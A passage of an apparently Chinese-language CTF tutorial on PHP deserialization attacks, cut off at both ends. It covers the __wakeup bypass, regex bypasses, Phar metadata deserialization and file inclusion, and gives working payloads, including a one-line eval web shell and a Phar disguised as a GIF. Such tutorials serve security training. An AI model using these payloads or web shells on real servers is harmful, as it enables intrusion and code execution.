class="token variable">$obj</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token comment">// 触发 __unset()</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 触发 __call()</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">hidden</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="特殊属性的反序列化"><a href="#特殊属性的反序列化" class="headerlink" title="特殊属性的反序列化"></a>特殊属性的反序列化</h3><p><strong>PHP类中的特殊属性</strong></p><p>序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，也会将属性的权限序列化进去。但不</p><p>同类型的属性会有不同的格式。</p><ol><li>Public 权限</li></ol><p>可以内部调用，实例调用等</p><ol start="2"><li>Private权限</li></ol><p>被private修饰的只能是同一个类的可以访问</p><ol start="3"><li>Protected权限</li></ol><p>对继承的类开放，没继承的类不开放</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">myClass</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tivon'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"man"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ser.dat'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>结果：O:7:"myClass":3:&#123;s:4:"name";s:5:"tivon";s:12:"myClassage";s:2:"20";s:6:"*sex";s:3:"man";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/179.PNG" alt="179"></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">Public 属性无需修改Private格式：%00类名%00属性名Protected格式：%00*%00属性名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>在url中传递参数可以使用 %00 代替空字符</strong></p><h4 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h4><h5 id="牛刀小试"><a href="#牛刀小试" class="headerlink" title="牛刀小试"></a>牛刀小试</h5><p>序列化已经存在的类，修改其属性值</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass Test&#123;    public $name&#x3D;&quot;tom&quot;;    public $age&#x3D;&quot;16&quot;;    public function get_age()&#123;    echo $this-&gt;age;    &#125;&#125;$boy &#x3D; new Test();#$boy-&gt;get_age();&#x2F;&#x2F;进行序列化echo serialize($boy);&#x2F;&#x2F;进行反序列化$str &#x3D; $_GET[&#39;str&#39;];$newboy &#x3D; unserialize($str);$newboy-&gt;get_age();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入一个 Test 类的实例对象，该对象的 name 值为 “admin” 即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag_&#123;xxxxxxxxxxxxxxxxxx&#125;'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$u</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'less2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="wakeup绕过CVE-2016-7124"><a href="#wakeup绕过CVE-2016-7124" class="headerlink" title="__wakeup绕过CVE-2016-7124"></a>__wakeup绕过CVE-2016-7124</h5><p>影响版本为 php5 ~ 5.6.25、php7 ~ 7.0.10</p><p>当序列化字符串中属性个数不正确时，__wakeup方法不会被调用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>修改后<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>攻防世界：</strong><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a> <strong>题目名称：</strong> unserialize3</p><p><img src="/2023/012220963/208.PNG" alt=" "></p><h5 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以在类名长度前加上+号，绕过正则，同样在属性个数、属性名长度的数字前都可以加上 + 号绕过正</p><p>则匹配</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>等同于<span class="token constant">O</span><span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>攻防世界：</strong><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a> <strong>题目名称：</strong> Web_php_unserialize</p><p><strong>题解：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"O:"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"O:+"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1:&#123;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"2:&#123;"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><h4 id="Phar反序列化概要"><a href="#Phar反序列化概要" class="headerlink" title="Phar反序列化概要"></a>Phar反序列化概要</h4><p>除了unserialize()来利用反序列化漏洞之外，还可以利用phar文件以序列化的形式存储用户自定义的</p><p>meta-data这一特性，扩大php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()</p><p>等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数</p><p>unserialize()的前提下，引起严重的php对象注入漏洞。</p><p>这个新的攻击方式被他公开在BlackHat会议演讲上。主题为：“不为人知的php反序列化漏洞”。它可以</p><p>使攻击者将相关漏洞的验证级别升级为远程代码执行。</p><h4 id="什么是Phar文件"><a href="#什么是Phar文件" class="headerlink" title="什么是Phar文件"></a>什么是Phar文件</h4><p>在软件中，Phar（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像、</p><p>样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。</p><p>Php通过用户定义和内置“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，比如：</p><p>fopen()、copy()、file_exists()、filesize()。Phar://就是一种内置的流包装器</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>中常见的流包装器如下：file<span class="token punctuation">:</span><span class="token comment">// 访问本地文件系统，在用文件系统函数时默认使用该包装器</span>http<span class="token punctuation">:</span><span class="token comment">// 访问HTTP(s)网址</span>ftp<span class="token punctuation">:</span><span class="token comment">// 访问FTP(s) urls</span>php<span class="token punctuation">:</span><span class="token comment">// 访问各个输入/输出流（I/O Streams）</span>zlib<span class="token punctuation">:</span><span class="token comment">// 压缩流</span>data<span class="token punctuation">:</span><span class="token comment">// 数据（RFC 2397）</span>glob<span class="token punctuation">:</span><span class="token comment">// 查找匹配的文件路径模式</span>phar<span class="token punctuation">:</span><span class="token comment">// php归档</span>ssh2<span class="token punctuation">:</span><span class="token comment">// Secure shell 2</span>rar<span class="token punctuation">:</span><span class="token comment">// RAR</span>ogg<span class="token punctuation">:</span><span class="token comment">// 音频流</span>expect<span class="token punctuation">:</span><span class="token comment">// 处理交互式的流</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="phar与文件包含"><a href="#phar与文件包含" class="headerlink" title="phar与文件包含"></a>phar与文件包含</h4><p>使用 Phar:// 伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们</p><p>的压缩包（其实就是一个压缩包），只不过换了一种方式执行。</p><ol><li>准备一个木马文件 shell.php</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    准备一个简单的文件包含漏洞模型 include.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>将shell.php文件压缩为 shell.zip 并改后缀为 shell.jpg</li><li>找到存在文件包含的漏洞点，使用phar://协议进行文件包含，格式如下：</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">用法：<span class="token operator">?</span>file<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//压缩包/内部文件</span>phar<span class="token punctuation">:</span><span class="token comment">//./shell.jpg/shell.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/209.PNG" alt=" "></p><h4 id="zip-协议与文件包含"><a href="#zip-协议与文件包含" class="headerlink" title="zip://协议与文件包含"></a>zip://协议与文件包含</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">使用zip协议，需要指定绝对路径，同时将<span class="token comment">#编码为%23，之后填上压缩包内的文件</span>zip<span class="token punctuation">:</span><span class="token comment">//D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span>压缩包内存在子文件夹zip<span class="token punctuation">:</span><span class="token comment">//D:\phpStudy\WWW\fileinclude\test.zip%23test\phpinfo.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/210.PNG" alt=" "></p><h4 id="Phar文件的结构"><a href="#Phar文件的结构" class="headerlink" title="Phar文件的结构"></a>Phar文件的结构</h4><p> phar文件都包含以下几个部分</p><ol><li><strong>stub</strong></li></ol><p>phar文件的标志，必须以xxx_HALT_COMPLER();?&gt;结尾，否则无法识别。Xxx可以为自定义内容</p><ol start="2"><li><strong>manifest</strong></li></ol><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分</p><p>还会以序列化的形式存储用户自定义的meta-data，Meta-data部分的信息会以序列化的形式储</p><p>存，这里就是漏洞利用的关键点。</p><p><img src="/2023/012220963/211.PNG" alt=" "></p><ol start="3"><li><strong>content</strong></li></ol><p>被压缩文件的内容, 在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利</p><p>用这个漏洞主要是为了触发它的反序列化 。</p><ol start="4"><li><strong>signature(可空)</strong></li></ol><p>签名，放在末尾</p><h4 id="生成一个Phar文件"><a href="#生成一个Phar文件" class="headerlink" title="生成一个Phar文件"></a>生成一个Phar文件</h4><h5 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h5><p>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p><p>将下列代码粘贴在php文件中，运行该php文件即可得到 phar 文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hack'</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一个简单的小例子"><a href="#一个简单的小例子" class="headerlink" title="一个简单的小例子"></a>一个简单的小例子</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar_demo.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>测试结果：</strong></p><p><img src="/2023/012220963/212.PNG" alt=" "></p><p><img src="/2023/012220963/213.PNG" alt=" "></p><p><strong>生成的phar文件要上传到对方服务器，才可以使用。</strong></p><h4 id="Phar反序列化漏洞的利用条件"><a href="#Phar反序列化漏洞的利用条件" class="headerlink" title="Phar反序列化漏洞的利用条件"></a>Phar反序列化漏洞的利用条件</h4><ol><li><p>Phar文件要能够上传到服务器端</p></li><li><p>要有可用的魔术方法作为“跳板”</p></li><li><p>文件操作函数的参数可控，且冒号、/、phar等特殊字符没有被过滤</p></li><li><p>受影响的文件操作函数有：</p></li></ol><p><img src="/2023/012220963/214.PNG" alt=" "></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">在跟踪了受影响函数的调用情况后发现，除了所有文件函数，只要是函数的实现过程直接或间接调用了php_stream_open_wrapper。都可能触发phar反序列化。exifexif_thumbnailexif_imagetypegdimageloadfontimagecreatefrom***Hashhash_hmac_filehash_filehash_update_filemd5_filesha1_filefile&#x2F;urlget_meta_tagsget_headersStandardgetimagesizegetimagesizefromstringZip$zip &#x3D; new ZipArchive();$res &#x3D; $zip-&gt;open(&#39;c.zip’);$zip-&gt;extractTo(&#39;phar:&#x2F;&#x2F;test.phar&#x2F;test’);Bzip&#x2F;Gzip$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;catsay&#x2F;test.phar&#x2F;test.txt’;$z &#x3D; &#39;compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;catsay&#x2F;test.phar&#x2F;test.txt&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Phar-CTF练习"><a href="#Phar-CTF练习" class="headerlink" title="Phar-CTF练习"></a>Phar-CTF练习</h4><h5 id="绕过文件格式限制的例子"><a href="#绕过文件格式限制的例子" class="headerlink" title="绕过文件格式限制的例子"></a>绕过文件格式限制的例子</h5><h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p>首先是根据index.php写一个生成phar的php文件，当然需要绕过gif图片文件头判断，所以需要加</p><p>GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用</p><p>file_exists，使用 phar:// 执行代码</p><h6 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h6><p>eval.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">AnyClass</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "ok";'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//GIF89a进行图片欺诈</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">-></span> <span class="token property">output</span><span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span><span class="token comment">// $object -> output= 'eval(@$_REQUEST[1]);';</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反序列化漏洞POP链"><a href="#反序列化漏洞POP链" class="headerlink" title="反序列化漏洞POP链"></a>反序列化漏洞POP链</h3><h4 id="构造POP链题目1"><a href="#构造POP链题目1" class="headerlink" title="构造POP链题目1"></a>构造POP链题目1</h4><p><img src="/2023/012220963/215.PNG" alt=" "></p><p><strong>pop1.php</strong></p><p>获取位于目标主机 D:\flag.txt 中的flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//hint is in hint.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'syst3m("type 